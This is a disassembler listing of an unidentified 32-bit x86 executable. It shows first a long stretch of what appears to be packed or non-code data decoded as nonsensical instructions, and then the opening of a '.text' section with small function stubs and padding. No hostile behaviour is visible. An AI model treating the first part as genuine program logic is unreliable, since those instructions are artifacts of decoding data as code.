  421a6d:	add    DWORD PTR [edx+edx*8],ebx
  421a70:	inc    edx
  421a71:	or     BYTE PTR [ebp-0x167427e1],dl
  421a77:	mov    ds:0x5a245588,al
  421a7c:	dec    edi
  421a7d:	cmp    al,0x95
  421a7f:	das    
  421a80:	loopne 0x421a0d
  421a82:	fnstcw WORD PTR [edx+0x6f64b70c]
  421a88:	mov    DWORD PTR [ebp-0x4],edx
  421a8b:	(bad)  
  421a8c:	inc    ebx
  421a8d:	or     ah,BYTE PTR [edx+edx*8]
  421a90:	inc    edx
  421a91:	call   0x40437a0a
  421a96:	sbb    al,0xd0
  421a98:	or     bh,BYTE PTR [eax]
	...
  421ac2:	add    BYTE PTR [ebx+0x1a],ch
  421ac5:	add    BYTE PTR [ecx-0xc],dl
  421ac8:	push   esp
  421ac9:	cld    
  421aca:	jmp    ebx
  421acc:	fadd   st,st(3)
  421ace:	or     BYTE PTR [ebp+0x5c6af01e],ah
  421ad4:	xor    eax,DWORD PTR [eax]
  421ad6:	xor    BYTE PTR [ebx+ebx*2],bl
  421ad9:	push   0x5aac00
  421ade:	push   0x1c
  421ae0:	les    edx,FWORD PTR [edx-0x10]
  421ae3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ae4:	push   ds
  421ae5:	in     al,0x8b
  421ae7:	push   ecx
  421ae8:	mov    ebx,0x2b484288
  421aed:	mov    DWORD PTR [ebp+0x24],ecx
  421af0:	sub    cl,BYTE PTR [ecx-0x17d687ab]
  421af6:	or     DWORD PTR [edx+0x5883fcc4],0x7045c557
  421b00:	pop    ebx
  421b01:	add    BYTE PTR [eax],al
  421b03:	sbb    al,0xb0
  421b05:	push   es
  421b06:	mov    esp,ecx
  421b08:	into   
  421b09:	add    al,0x1d
  421b0c:	rol    BYTE PTR [edx-0xc],cl
  421b0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b10:	push   ss
  421b11:	loopne 0x421b22
  421b13:	mov    ebp,DWORD PTR [edx]
  421b15:	push   es
  421b16:	cmp    ecx,esi
  421b18:	into   
  421b19:	jo     0x421b74
  421b1b:	xchg   edi,eax
  421b1c:	push   ds
  421b1d:	call   0xb0cfa5
  421b22:	je     0x421afd
  421b24:	iret   
  421b25:	dec    edx
  421b26:	call   0x421b2b
	...
  421b4f:	add    BYTE PTR [edi-0x57ffefbe],bl
  421b55:	xchg   BYTE PTR [ecx+0x41d00455],cl
  421b5b:	adc    BYTE PTR [edi+0x6d8be015],ah
  421b61:	xchg   DWORD PTR [ebx-0x773bd3bc],ecx
  421b67:	dec    ebp
  421b68:	cld    
  421b69:	xchg   edx,edx
  421b6b:	imul   DWORD PTR [ebp-0x79]
  421b6e:	mov    DWORD PTR [ebp-0x4],edx
  421b71:	push   ebx
  421b72:	lods   eax,DWORD PTR ds:[esi]
  421b73:	inc    edx
  421b74:	and    BYTE PTR [ebx],ch
  421b76:	mov    DWORD PTR [ebp-0x3c],eax
  421b79:	iret   
  421b7a:	dec    edx
  421b7b:	or     BYTE PTR [edi],bl
  421b7d:	adc    edx,DWORD PTR [ecx+edx*2]
  421b80:	xchg   edi,eax
  421b81:	sub    eax,0xbf598be8
  421b86:	add    BYTE PTR [edx+0x28],al
  421b89:	sub    ebp,eax
  421b8b:	adc    eax,0x83fcc3b2
  421b90:	loopne 0x421be8
  421b92:	mov    DWORD PTR [ebp-0x4c],ecx
  421b95:	xlat   BYTE PTR ds:[ebx]
  421b96:	mov    esi,0xe815a528
  421b9b:	jmp    0x421b4b
  421b9d:	iret   
  421b9e:	push   edx
  421b9f:	in     al,0xee
  421ba1:	mov    dl,0xcd
  421ba3:	cld    
  421ba4:	add    ebx,0xffffff80
  421ba7:	les    esp,FWORD PTR [eax]
  421ba9:	xor    edx,DWORD PTR [ebx+eax*1]
  421bac:	fcomp  QWORD PTR [edx-0x61]
  421baf:	cmp    bl,dh
  421bb1:	sbb    DWORD PTR [eax],eax
  421bb3:	push   eax
	...
  421bdc:	add    BYTE PTR [edi+ecx*1-0x7],dh
  421be0:	call   FWORD PTR [ebx-0x29]
  421be3:	ret    
  421be4:	or     BYTE PTR [ebp+0x983dc1d],ah
  421bea:	(bad)  
  421beb:	jne    0x421c2e
  421bed:	sbb    al,0x5b
  421bef:	jae    0x421bfb
  421bf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bf2:	push   ebp
  421bf3:	sub    al,0x77
  421bf5:	fstp   QWORD PTR [edx+0x4f]
  421bf8:	call   ecx
  421bfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bfb:	cmp    BYTE PTR ds:0x3f4be8,0x1c
  421c02:	dec    eax
  421c03:	sbb    al,0x6a
  421c05:	pop    esp
  421c06:	xor    eax,DWORD PTR [eax]
  421c08:	xor    BYTE PTR [ebx+ebx*2],bl
  421c0b:	mov    DWORD PTR [ebp+0x0],edx
  421c0e:	mov    DWORD PTR cs:[ebp-0x4],eax
  421c12:	(bad)  
  421c13:	inc    edi
  421c14:	xor    al,0x4d
  421c16:	ret    0xf052
  421c19:	mov    edi,0x1c417567
  421c1e:	mov    dh,0x12
  421c20:	push   0x5c
  421c22:	xor    eax,DWORD PTR [eax]
  421c24:	xor    BYTE PTR [ebx+ebx*2],bl
  421c27:	mov    DWORD PTR [ebp-0x38],edx
  421c2a:	sub    eax,0x28c3006a
  421c2f:	lock mov ds:0x3f4a10,eax
  421c35:	lahf   
  421c36:	adc    BYTE PTR [edi+esi*2],0x5d
  421c3a:	pop    ebx
  421c3b:	add    BYTE PTR [ebp+0x9],dh
  421c3e:	xor    eax,0x6840
	...
  421c67:	add    BYTE PTR [eax],al
  421c69:	add    BYTE PTR [ebx+ecx*4],bl
  421c6c:	add    BYTE PTR [eax],al
  421c6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c6f:	sbb    ah,bh
  421c71:	push   eax
  421c72:	neg    BYTE PTR [edx-0x3]
  421c75:	push   ebp
  421c76:	mov    esi,?
  421c78:	adc    esi,DWORD PTR [edi-0x23]
  421c7b:	pop    edx
  421c7c:	mov    DWORD PTR [ebp+0x78],ecx
  421c7f:	aam    0x4a
  421c81:	fcom   DWORD PTR [edi-0x267427d8]
  421c87:	mov    ds:0xd4184200,al
  421c8c:	inc    edx
  421c8d:	loopne 0x421c36
  421c8f:	adc    al,ah
  421c91:	mov    ebp,ebp
  421c93:	sub    dl,BYTE PTR [edx-0x75]
  421c96:	fnstenv [esi+0x67298b4f]
  421c9c:	jne    0x421cdf
  421c9e:	sbb    al,0x2c
  421ca0:	call   0xfd0445f6
  421ca5:	sbb    DWORD PTR [eax+0x4f],0xffffff89
  421ca9:	push   ebp
  421caa:	cld    
  421cab:	fnstsw WORD PTR [ecx+0x5b1ca4]
  421cb1:	add    BYTE PTR [eax-0x3ba767c],dl
  421cb7:	aad    0x4a
  421cb9:	fcomp  DWORD PTR [edi]
  421cbb:	rcr    DWORD PTR [edi-0x78a4e400],cl
  421cc1:	dec    ebp
  421cc2:	clc    
  421cc3:	aad    0x52
  421cc5:	loopne 0x421c84
  421cc7:	data16 jne 0x421d0b
  421cca:	sbb    al,0x76
  421ccc:	inc    edx
  421ccd:	xor    al,0x0
	...
  421cf7:	jg     0x421d13
  421cf9:	jne    0x421d3c
  421cfb:	sbb    al,0xd6
  421cfd:	or     al,BYTE PTR [eax+0x4b]
  421d00:	sbb    al,0x0
  421d02:	push   ecx
  421d03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d04:	addr16 adc al,0x77
  421d07:	pop    ebp
  421d08:	pop    ebx
  421d09:	push   edx
  421d0a:	mov    esp,DWORD PTR [ecx-0x51]
  421d0d:	dec    edi
  421d0e:	call   0x3ee2f3
  421d13:	lahf   
  421d14:	xchg   esi,eax
  421d15:	or     ecx,DWORD PTR [ebx+0x1588bae1]
  421d1b:	xor    BYTE PTR [edx+0x3f],cl
  421d1e:	add    BYTE PTR [edi],bl
  421d20:	sub    al,0x28
  421d22:	mov    DWORD PTR [ecx],edx
  421d24:	sub    esi,DWORD PTR [ebp+0x41]
  421d27:	sbb    al,0xde
  421d29:	cmp    dh,BYTE PTR [ebx+esi*8]
  421d2c:	sbb    eax,DWORD PTR [eax]
  421d2e:	add    cl,ch
  421d30:	outs   dx,BYTE PTR ds:[esi]
  421d31:	lahf   
  421d32:	adc    al,0xd3
  421d34:	sbb    eax,DWORD PTR [eax]
  421d36:	push   eax
  421d37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d38:	dec    edi
  421d39:	push   eax
  421d3a:	ja     0x421d19
  421d3c:	pop    edx
  421d3d:	dec    edi
  421d3e:	mov    ebp,DWORD PTR [ecx]
  421d40:	outs   dx,DWORD PTR ds:[esi]
  421d41:	jne    0x421d84
  421d43:	sbb    al,0x2d
  421d45:	call   0xfd034e7f
  421d4a:	and    DWORD PTR [eax+0x4e],0xffffff9f
  421d4e:	adc    al,0xab
  421d50:	sbb    eax,DWORD PTR [eax]
  421d52:	push   eax
  421d53:	add    al,0x59
  421d55:	cli    
  421d56:	call   DWORD PTR [ebx]
  421d58:	ffree  st(3)
  421d5a:	add    al,0x0
	...
  421d84:	idiv   DWORD PTR [ebx]
  421d86:	push   0x1b1f24
  421d8b:	mov    ebp,DWORD PTR [ecx]
  421d8d:	xor    DWORD PTR [ebp+0x41],0x1c
  421d91:	sub    ch,al
  421d93:	adc    esi,esp
  421d95:	sar    ah,0x83
  421d98:	fcom   DWORD PTR [ebx-0x79]
  421d9b:	inc    ebp
  421d9c:	lock aam 0x12
  421d9f:	adc    al,0x4b
  421da1:	sbb    al,BYTE PTR [eax]
  421da3:	push   edx
  421da4:	xchg   edi,eax
  421da5:	push   ss
  421da6:	loopne 0x421d33
  421da8:	adc    DWORD PTR [edi+0x75],esp
  421dab:	inc    ecx
  421dac:	sbb    al,0x5c
  421dae:	dec    eax
  421daf:	sub    BYTE PTR [ebp-0x2c],cl
  421db2:	adc    ch,BYTE PTR [ebx+esi*1]
  421db5:	sbb    al,BYTE PTR [eax]
  421db7:	push   edx
  421db8:	mov    ah,0xb4
  421dba:	sti    
  421dbb:	call   FWORD PTR [ebx-0x42f33c24]
  421dc1:	outs   dx,DWORD PTR ds:[esi]
  421dc2:	jne    0x421e05
  421dc4:	sbb    al,0x56
  421dc6:	shl    BYTE PTR [ebp+ebx*1+0x5b],0xa1
  421dcb:	pop    eax
  421dcc:	repz sbb DWORD PTR [eax],eax
  421dcf:	(bad)  
  421dd0:	loope  0x421d94
  421dd2:	dec    esi
  421dd3:	push   0xffffffdc
  421dd5:	xor    al,0x6
  421dd7:	mov    ecx,DWORD PTR [ecx]
  421dd9:	and    esi,DWORD PTR [ebp+0x41]
  421ddc:	sbb    al,0x2d
  421dde:	std    
  421ddf:	push   ebp
  421de0:	push   0x4bfca1b3
  421de5:	shl    BYTE PTR [edi+0x1],0x0
	...
  421e10:	add    BYTE PTR [ebx+ebx*2],bl
  421e13:	add    BYTE PTR [ebx+0x4c21e41],cl
  421e19:	sbb    al,0x8f
  421e1b:	retf   
  421e1c:	int3   
  421e1d:	pop    eax
  421e1e:	(bad)  
  421e1f:	retf   
  421e20:	int3   
  421e21:	leave  
  421e22:	shr    ebx,cl
  421e24:	mov    esp,DWORD PTR [ecx+0x53]
  421e27:	mov    DWORD PTR [eax+0x10],eax
  421e2a:	push   ds
  421e2b:	ror    esp,0xd8
  421e2e:	mov    cs,ebx
  421e30:	int3   
  421e31:	imul   edx,esp,0x285253eb
  421e37:	mov    DWORD PTR ds:0x3f483c,edi
  421e3d:	xchg   edi,eax
  421e3e:	pop    ebp
  421e3f:	sub    BYTE PTR [edi+0x5d],dh
  421e42:	pop    ebx
  421e43:	mov    DWORD PTR ds:0x3f4834,esi
  421e49:	jae    0x421e6c
  421e4b:	pop    ecx
  421e4c:	pop    ebp
  421e4d:	fisttp WORD PTR [esi-0x2b963335]
  421e53:	jmp    0x421ea6
  421e55:	inc    esp
  421e56:	xchg   DWORD PTR [ecx],eax
  421e58:	inc    eax
  421e59:	sbb    al,0xfa
  421e5b:	aaa    
  421e5c:	ja     0x421ebb
  421e5e:	pop    ebx
  421e5f:	push   eax
  421e60:	call   0x3ee095
  421e65:	lahf   
  421e66:	xchg   esi,eax
  421e67:	pop    es
  421e68:	mov    ecx,ebx
  421e6a:	mov    esi,0x2a144d88
  421e6f:	push   0x0
  421e71:	xchg   edi,eax
  421e72:	gs push esp
  421e74:	ja     0x421e76
	...
  421e9e:	fstp   QWORD PTR [edx+0x52]
  421ea1:	dec    ecx
  421ea3:	mov    esi,0x9bc9e588
  421ea8:	retf   
  421ea9:	int3   
  421eaa:	leave  
  421eab:	shr    ebx,cl
  421ead:	or     DWORD PTR [eax+0x76],0xffffffc5
  421eb1:	inc    ebp
  421eb2:	push   esp
  421eb3:	pop    edx
  421eb4:	add    BYTE PTR [eax],al
  421eb6:	sbb    al,0x98
  421eb8:	inc    edx
  421eb9:	fadd   st(4),st
  421ebb:	pop    edx
  421ebc:	add    BYTE PTR [eax],al
  421ebe:	arpl   WORD PTR ds:0x5b1c01f4,dx
  421ec4:	add    bh,al
  421ec6:	loope  0x421e86
  421ec8:	(bad)  
  421ec9:	call   FWORD PTR [ebx+ebx*2]
  421ecc:	lds    eax,FWORD PTR [ebp+0x0]
  421ecf:	pop    esp
  421ed0:	add    BYTE PTR [eax],al
  421ed2:	sbb    al,0xd2
  421ed4:	dec    edx
  421ed5:	or     BYTE PTR [ebp+0x5d772c50],dl
  421edb:	pop    ebx
  421edc:	call   0xfd01134a
  421ee1:	mov    eax,ds:0x3f4640
  421ee6:	inc    ecx
  421ee7:	mov    esi,0x471c00fc
  421eec:	or     al,0xc7
  421eee:	and    DWORD PTR [edi+0x5b1c4175],eax
  421ef4:	add    BYTE PTR [eax],al
  421ef6:	sbb    al,0xb2
  421ef8:	or     edi,eax
  421efa:	sbb    DWORD PTR [edi+0x5c1c4175],eax
	...
  421f28:	add    BYTE PTR [eax],al
  421f2a:	add    BYTE PTR [edx+ebx*8],bl
  421f2d:	cmp    ch,BYTE PTR [ebx+esi*1]
  421f30:	sbb    al,0x0
  421f32:	add    BYTE PTR [ecx],ch
  421f34:	push   ecx
  421f35:	lds    eax,FWORD PTR ds:0x3f4650
  421f3b:	sbb    al,0x5b
  421f3d:	add    BYTE PTR [eax],al
  421f3f:	lahf   
  421f40:	xor    BYTE PTR [edi+esi*2],0xdd
  421f44:	pop    edx
  421f45:	add    BYTE PTR [ebp+0x29],dh
  421f48:	xor    DWORD PTR [eax],eax
  421f4a:	dec    DWORD PTR [ecx]
  421f4c:	pop    ebx
  421f4d:	jne    0x421f90
  421f4f:	sbb    al,0xfa
  421f51:	sub    esi,DWORD PTR [edi-0x23]
  421f54:	pop    edx
  421f55:	mov    DWORD PTR ds:0x3f4608,ecx
  421f5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f5c:	adc    al,ch
  421f5e:	mov    esi,DWORD PTR [ecx]
  421f60:	outs   dx,DWORD PTR ds:[esi]
  421f61:	jne    0x421fa4
  421f63:	sbb    al,0xd2
  421f65:	inc    edx
  421f66:	call   0x897e388a
  421f6b:	fnstenv [edx-0x2bcbb278]
  421f71:	or     bl,BYTE PTR [ebx+ebp*4]
  421f74:	sbb    eax,DWORD PTR [eax]
  421f76:	push   0x405a5c
  421f7b:	adc    ebp,DWORD PTR [eax+0x0]
  421f7e:	ja     0x421fdd
  421f80:	pop    ebx
  421f81:	mov    eax,ds:0x1c8b38
  421f86:	(bad)  
  421f87:	and    DWORD PTR [ebx],edx
  421f89:	jne    0x421fcc
  421f8b:	sbb    al,0x38
  421f8d:	add    DWORD PTR [eax+0x0],eax
	...
  421fb8:	sbb    al,0x33
  421fba:	push   eax
  421fbb:	add    ebx,DWORD PTR [ebx+ebx*2-0x77]
  421fbf:	adc    eax,0x3f4614
  421fc4:	outs   dx,BYTE PTR ds:[esi]
  421fc5:	mov    bl,0x81
  421fc7:	clc    
  421fc8:	retf   
  421fc9:	mov    ebp,0xfa14c480
  421fce:	inc    ebx
  421fcf:	ja     0x42202e
  421fd1:	pop    ebx
  421fd2:	std    
  421fd3:	adc    eax,0x3f4658
  421fd8:	jg     0x422000
  421fda:	jne    0x42201d
  421fdc:	sbb    al,0xfc
  421fde:	inc    edi
  421fdf:	ja     0x421fbe
  421fe1:	pop    edx
  421fe2:	push   eax
  421fe3:	call   0x3edcb0
  421fe8:	lahf   
  421fe9:	xchg   esi,eax
  421fea:	add    ecx,DWORD PTR [ecx+0x4d88cad9]
  421ff0:	ins    BYTE PTR es:[edi],dx
  421ff1:	sub    ebp,eax
  421ff3:	aad    0x72
  421ff5:	mov    ebp,0x566083fc
  421ffa:	mov    eax,ds:0x1beb30
  421fff:	mov    esi,ecx
  422001:	retf   0x6a51
  422004:	sbb    al,0xfc
  422006:	das    
  422007:	ja     0x421fe6
  422009:	pop    edx
  42200a:	push   eax
  42200b:	call   0x3ee2f0
  422010:	lahf   
  422011:	xchg   esi,eax
  422012:	or     ecx,DWORD PTR [ebx+0x4d86cae1]
  422018:	cmp    al,0xd1
  42201a:	push   edx
  42201b:	cld    
	...
  422044:	add    bh,ah
  422046:	daa    
  422047:	lock jae 0x4220c0
  42204a:	rol    BYTE PTR [edx-0x20],1
  42204d:	ins    BYTE PTR es:[edi],dx
  42204e:	ror    BYTE PTR [edx-0x24],1
  422051:	ins    DWORD PTR es:[edi],dx
  422052:	mov    bl,0xad
  422054:	sti    
  422055:	add    edi,DWORD PTR [ebp-0x7db3b80]
  42205b:	cmp    esi,DWORD PTR [edi+0x5d]
  42205e:	pop    ebx
  42205f:	mov    DWORD PTR ds:0x3f4428,edx
  422065:	dec    esi
  422066:	cli    
  422067:	inc    edi
  422068:	ja     0x4220c7
  42206a:	pop    ebx
  42206b:	add    DWORD PTR [ebp-0x48],eax
  42206e:	sub    ecx,DWORD PTR [ecx+0x3f440c0d]
  422074:	add    BYTE PTR [edi],bl
  422076:	push   cs
  422077:	cld    
  422078:	push   ecx
  422079:	(bad)  
  42207a:	in     al,0xf9
  42207c:	push   DWORD PTR [ebx-0x68f33c28]
  422082:	es hlt 
  422084:	add    ecx,DWORD PTR [ecx-0x61]
  422087:	add    BYTE PTR [ebp-0x80],dl
  42208a:	rcl    BYTE PTR [edx-0x1c],cl
  42208d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42208e:	push   ss
  42208f:	cld    
  422090:	add    esp,ecx
  422092:	sahf   
  422093:	xchg   BYTE PTR [ebp-0x80],al
  422096:	ror    BYTE PTR [edx-0x20],1
  422099:	inc    edi
  42209a:	dec    esi
  42209b:	cmp    al,0x77
  42209d:	fstp   QWORD PTR [edx-0x79]
  4220a0:	dec    ebp
  4220a1:	jl     0x422053
  4220a3:	popf   
  4220a4:	(bad)  
  4220a5:	fld    st(2)
  4220a7:	(bad)  
  4220a8:	inc    DWORD PTR [eax]
	...
  4220d2:	sbb    al,0x5b
  4220d4:	jmp    0xf868c7e2
  4220d9:	sbb    DWORD PTR [esi+0x57],0xffffff87
  4220dd:	push   ebp
  4220de:	inc    esp
  4220df:	rol    BYTE PTR [edx-0x8],1
  4220e2:	not    DWORD PTR ds:0xcff473f0
  4220e8:	or     dh,BYTE PTR [eax]
  4220ea:	mov    bl,0x19
  4220ec:	add    BYTE PTR [ebx],al
  4220ee:	rol    edx,1
  4220f0:	mov    BYTE PTR [ecx],dl
  4220f2:	pop    ds
  4220f3:	es clc 
  4220f5:	mov    eax,ds:0x3f444c
  4220fa:	pop    ds
  4220fb:	push   ss
  4220fc:	clc    
  4220fd:	mov    DWORD PTR [eax+edx*8],ebp
  422100:	dec    edx
  422101:	clc    
  422102:	popf   
  422103:	cdq    
  422104:	out    0x3,al
  422106:	sbb    al,0x5b
  422108:	mov    DWORD PTR ds:0x3f442c,edx
  42210e:	pop    ds
  42210f:	es clc 
  422111:	xor    esp,DWORD PTR [esi]
  422113:	cli    
  422114:	das    
  422115:	ja     0x422174
  422117:	pop    ebx
  422118:	add    DWORD PTR [ebp-0x3c],eax
  42211b:	rol    DWORD PTR [edi],1
  42211d:	jmp    0x4220aa
  42211f:	shr    DWORD PTR [edx],1
  422121:	and    al,0x33
  422123:	sbb    al,BYTE PTR [eax]
  422125:	mov    ecx,esi
  422127:	jp     0x42219e
  422129:	inc    ecx
  42212a:	sbb    al,0x88
  42212c:	(bad)  
  42212d:	mov    ecx,ebp
  42212f:	bound  esi,QWORD PTR [ebp+0x41]
  422132:	sbb    al,0x88
  422134:	(bad)  
  422135:	mov    DWORD PTR [eax],eax
	...
  42215f:	xor    DWORD PTR [ebx+0x75],esi
  422162:	inc    ecx
  422163:	sbb    al,0xb3
  422165:	or     eax,0x88bb83f8
  42216a:	or     eax,0x3f442c
  42216f:	int    0xb2
  422171:	add    ebx,edi
  422173:	imul   edi,DWORD PTR [ebx+0x56e9c082],0x31
  42217a:	rol    BYTE PTR [edi+0x70],0x89
  42217e:	and    eax,0x3f43f8
  422183:	lahf   
  422184:	xchg   esi,eax
  422185:	add    eax,DWORD PTR [ebx+0x41758701]
  42218b:	sbb    al,0x5b
  42218d:	je     0x422198
  42218f:	jge    0x4221f7
  422191:	jne    0x4221d4
  422193:	sbb    al,0xd2
  422195:	inc    ebx
  422196:	and    al,0x18
  422198:	mov    bl,0x89
  42219a:	std    
  42219b:	sbb    edi,DWORD PTR [ebx+0x326c1588]
  4221a1:	aas    
  4221a2:	add    BYTE PTR [esi-0x62],ch
  4221a5:	xor    al,al
  4221a7:	xchg   edi,eax
  4221a8:	rcr    BYTE PTR [edx-0x3d],0x1c
  4221ac:	pop    ebx
  4221ad:	add    BYTE PTR [eax],al
  4221af:	sbb    al,0x5b
  4221b1:	add    BYTE PTR [eax],al
  4221b3:	sbb    al,0x5b
  4221b5:	add    BYTE PTR [eax],al
  4221b7:	sbb    al,0x5b
  4221b9:	add    BYTE PTR [eax],al
  4221bb:	sbb    al,0x5b
  4221bd:	add    BYTE PTR [eax],al
  4221bf:	sbb    al,0x5b
	...
  4221e9:	add    BYTE PTR [eax],al
  4221eb:	add    BYTE PTR [ebx+ebx*2],bl
  4221ee:	add    BYTE PTR [eax],al
  4221f0:	sbb    al,0x5b
  4221f2:	add    BYTE PTR [eax],al
  4221f4:	sbb    al,0x5b
  4221f6:	add    BYTE PTR [eax],al
  4221f8:	sbb    al,0x5b
  4221fa:	add    BYTE PTR [eax],al
  4221fc:	sbb    al,0x5b
  4221fe:	add    BYTE PTR [eax],al
  422200:	sbb    al,0x5b
  422202:	add    BYTE PTR [eax],al
  422204:	sbb    al,0x5b
  422206:	add    BYTE PTR [eax],al
  422208:	sbb    al,0x5b
  42220a:	add    BYTE PTR [eax],al
  42220c:	sbb    al,0x5b
  42220e:	add    BYTE PTR [eax],al
  422210:	sbb    al,0x5b
  422212:	add    BYTE PTR [eax],al
  422214:	sbb    al,0x5b
  422216:	add    BYTE PTR [eax],al
  422218:	sbb    al,0x5b
  42221a:	add    BYTE PTR [eax],al
  42221c:	sbb    al,0x5b
  42221e:	add    BYTE PTR [eax],al
  422220:	sbb    al,0x5b
  422222:	add    BYTE PTR [eax],al
  422224:	sbb    al,0x5b
  422226:	add    BYTE PTR [eax],al
  422228:	sbb    al,0x5b
  42222a:	add    BYTE PTR [eax],al
  42222c:	sbb    al,0x5b
  42222e:	add    BYTE PTR [eax],al
  422230:	sbb    al,0x5b
  422232:	add    BYTE PTR [eax],al
  422234:	sbb    al,0x5b
  422236:	add    BYTE PTR [eax],al
  422238:	sbb    al,0x5b
  42223a:	add    BYTE PTR [eax],al
  42223c:	sbb    al,0x5b
  42223e:	add    BYTE PTR [eax],al
  422240:	sbb    al,0x5b
  422242:	add    BYTE PTR [eax],al
  422244:	sbb    al,0x5b
  422246:	add    BYTE PTR [eax],al
  422248:	sbb    al,0x5b
  42224a:	add    BYTE PTR [eax],al
  42224c:	sbb    al,0x5b
	...
  422276:	add    BYTE PTR [eax],al
  422278:	add    BYTE PTR [ebx+ebx*2],bl
  42227b:	add    BYTE PTR [eax],al
  42227d:	sbb    al,0x5b
  42227f:	add    BYTE PTR [eax],al
  422281:	sbb    al,0x5b
  422283:	add    BYTE PTR [eax],al
  422285:	sbb    al,0x5b
  422287:	add    BYTE PTR [eax],al
  422289:	sbb    al,0x5b
  42228b:	add    BYTE PTR [eax],al
  42228d:	sbb    al,0x5b
  42228f:	add    BYTE PTR [eax],al
  422291:	sbb    al,0x5b
  422293:	add    BYTE PTR [eax],al
  422295:	sbb    al,0x5b
  422297:	add    BYTE PTR [eax],al
  422299:	sbb    al,0x5b
  42229b:	add    BYTE PTR [eax],al
  42229d:	sbb    al,0x5b
  42229f:	add    BYTE PTR [eax],al
  4222a1:	sbb    al,0x5b
  4222a3:	add    BYTE PTR [eax],al
  4222a5:	sbb    al,0x5b
  4222a7:	add    BYTE PTR [eax],al
  4222a9:	sbb    al,0x5b
  4222ab:	add    BYTE PTR [eax],al
  4222ad:	sbb    al,0x5b
  4222af:	add    BYTE PTR [eax],al
  4222b1:	sbb    al,0x5b
  4222b3:	add    BYTE PTR [eax],al
  4222b5:	sbb    al,0x5b
  4222b7:	add    BYTE PTR [eax],al
  4222b9:	sbb    al,0x5b
  4222bb:	add    BYTE PTR [eax],al
  4222bd:	sbb    al,0x5b
  4222bf:	add    BYTE PTR [eax],al
  4222c1:	sbb    al,0x5b
  4222c3:	add    BYTE PTR [eax],al
  4222c5:	sbb    al,0x5b
  4222c7:	add    BYTE PTR [eax],al
  4222c9:	sbb    al,0x5b
  4222cb:	add    BYTE PTR [eax],al
  4222cd:	sbb    al,0x5b
  4222cf:	add    BYTE PTR [eax],al
  4222d1:	sbb    al,0x5b
  4222d3:	add    BYTE PTR [eax],al
  4222d5:	sbb    al,0x5b
  4222d7:	add    BYTE PTR [eax],al
  4222d9:	sbb    al,0x5b
	...
  422303:	add    BYTE PTR [eax],al
  422305:	add    BYTE PTR [ebx+ebx*2],bl
  422308:	add    BYTE PTR [eax],al
  42230a:	sbb    al,0x5b
  42230c:	add    BYTE PTR [eax],al
  42230e:	sbb    al,0x5b
  422310:	add    BYTE PTR [eax],al
  422312:	sbb    al,0x5b
  422314:	add    BYTE PTR [eax],al
  422316:	sbb    al,0x5b
  422318:	add    BYTE PTR [eax],al
  42231a:	sbb    al,0x5b
  42231c:	add    BYTE PTR [eax],al
  42231e:	sbb    al,0x5b
  422320:	add    BYTE PTR [eax],al
  422322:	sbb    al,0x5b
  422324:	add    BYTE PTR [eax],al
  422326:	sbb    al,0x5b
  422328:	add    BYTE PTR [eax],al
  42232a:	sbb    al,0x5b
  42232c:	add    BYTE PTR [eax],al
  42232e:	sbb    al,0x5b
	...

Disassembly of section .text:

00423000 <.text>:
  423000:	push   ebp
  423001:	mov    ebp,esp
  423003:	pop    ebp
  423004:	ret    0x10
  423007:	int3   
  423008:	int3   
  423009:	int3   
  42300a:	int3   
  42300b:	int3   
  42300c:	int3   
  42300d:	int3   
  42300e:	int3   
  42300f:	int3   
  423010:	push   ebp
  423011:	mov    ebp,esp
  423013:	pop    ebp
  423014:	ret    0x10
  423017:	int3   
  423018:	int3   
  423019:	int3   
  42301a:	int3   
  42301b:	int3   
  42301c:	int3   
  42301d:	int3   
  42301e:	int3   
  42301f:	int3   
  423020:	push   ebp
  423021:	mov    ebp,esp
  423023:	call   0x4236b0
  423028:	mov    eax,ds:0x4258d0
  42302d:	push   eax
  42302e:	call   0x423730
  423033:	add    esp,0x4
  423036:	mov    ds:0x4258d4,eax
  42303b:	pop    ebp
  42303c:	ret    
  42303d:	int3   
  42303e:	int3   
  42303f:	int3   
  423040:	push   ebp
  423041:	mov    ebp,esp
  423043:	push   ecx
  423044:	mov    DWORD PTR [ebp-0x4],0x4
  42304b:	mov    eax,DWORD PTR [ebp-0x4]
  42304e:	add    eax,0x401118
  423053:	mov    ds:0x4258d8,eax
  423058:	mov    esp,ebp
  42305a:	pop    ebp
  42305b:	ret    
  42305c:	int3   
  42305d:	int3   
  42305e:	int3   
  42305f:	int3   
  423060:	push   ebp
  423061:	mov    ebp,esp
  423063:	mov    eax,DWORD PTR [ebp+0x8]
  423066:	mov    ecx,DWORD PTR [ebp+0x8]
  423069:	add    ecx,DWORD PTR [eax+0x4]
  42306c:	mov    eax,ecx
  42306e:	pop    ebp
  42306f:	ret    
  423070:	push   ebp
  423071:	mov    ebp,esp
  423073:	push   ecx
  423074:	mov    DWORD PTR [ebp-0x4],0x81efe
  42307b:	mov    DWORD PTR [ebp-0x4],0x81efe
  423082:	mov    DWORD PTR [ebp-0x4],0x81efe
  423089:	mov    DWORD PTR [ebp-0x4],0x81efe
  423090:	mov    DWORD PTR [ebp-0x4],0x81efe
  423097:	mov    eax,DWORD PTR [ebp+0x8]
  42309a:	mov    eax,DWORD PTR [eax-0x4]
  42309d:	mov    esp,ebp
  42309f:	pop    ebp
  4230a0:	ret    
  4230a1:	int3   
  4230a2:	int3   
  4230a3:	int3   
  4230a4:	int3   
  4230a5:	int3   
  4230a6:	int3   
  4230a7:	int3   
  4230a8:	int3   
  4230a9:	int3   
  4230aa:	int3   
  4230ab:	int3   
  4230ac:	int3   
  4230ad:	int3   
  4230ae:	int3   
  4230af:	int3   
  4230b0:	push   ebp
  4230b1:	mov    ebp,esp
  4230b3:	mov    eax,DWORD PTR [ebp+0x8]
  4230b6:	mov    ax,WORD PTR [eax]
  4230b9:	pop    ebp
  4230ba:	ret    
  4230bb:	int3   
  4230bc:	int3   
  4230bd:	int3   
  4230be:	int3   
  4230bf:	int3   
  4230c0:	push   ebp
  4230c1:	mov    ebp,esp
  4230c3:	sub    esp,0x18
